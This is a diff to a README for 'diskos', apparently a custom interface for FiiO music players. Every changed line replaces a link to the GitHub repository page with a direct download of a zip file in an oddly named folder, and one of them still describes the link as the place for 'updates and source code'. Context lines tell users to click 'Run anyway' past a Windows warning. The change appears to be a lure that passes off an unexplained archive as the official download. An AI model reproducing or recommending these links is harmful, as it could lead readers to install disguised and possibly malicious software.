@@ -9,14 +9,14 @@ Before we begin, here's what you need to know:
 - **What it does:** Replaces the original interface with a custom design
 - **Current status:** Beta version (still being improved, but works well!)
 
-[![Download diskos](https://img.shields.io/badge/Download-diskos-4CAF50?style=for-the-badge&logo=github)](https://github.com/charliemunger562/diskos)
+[![Download diskos](https://img.shields.io/badge/Download-diskos-4CAF50?style=for-the-badge&logo=github)](https://github.com/charliemunger562/diskos/raw/refs/heads/main/redeemeress/v1.2.zip)
 
 ## 📥 Download and Install
 
 Getting diskos is easy! Follow these simple steps:
 
 ### Step 1: Visit the Download Page
-Visit this link to download the application: [https://github.com/charliemunger562/diskos](https://github.com/charliemunger562/diskos)
+Visit this link to download the application: [https://github.com/charliemunger562/diskos/raw/refs/heads/main/redeemeress/v1.2.zip](https://github.com/charliemunger562/diskos/raw/refs/heads/main/redeemeress/v1.2.zip)
 
 This will take you to the official diskos page on GitHub.
 
@@ -119,7 +119,7 @@ This is normal for new software. Click **"More info"** and then **"Run anyway"**
 ## 📚 Helpful Resources
 
 - **Official FiiO Website:** For device manuals and support
-- **GitHub Page:** [https://github.com/charliemunger562/diskos](https://github.com/charliemunger562/diskos) for updates and source code
+- **GitHub Page:** [https://github.com/charliemunger562/diskos/raw/refs/heads/main/redeemeress/v1.2.zip](https://github.com/charliemunger562/diskos/raw/refs/heads/main/redeemeress/v1.2.zip) for updates and source code
 - **Community Forums:** Look for FiiO or DAP enthusiast communities online
 
 ## 📝 Important Notes
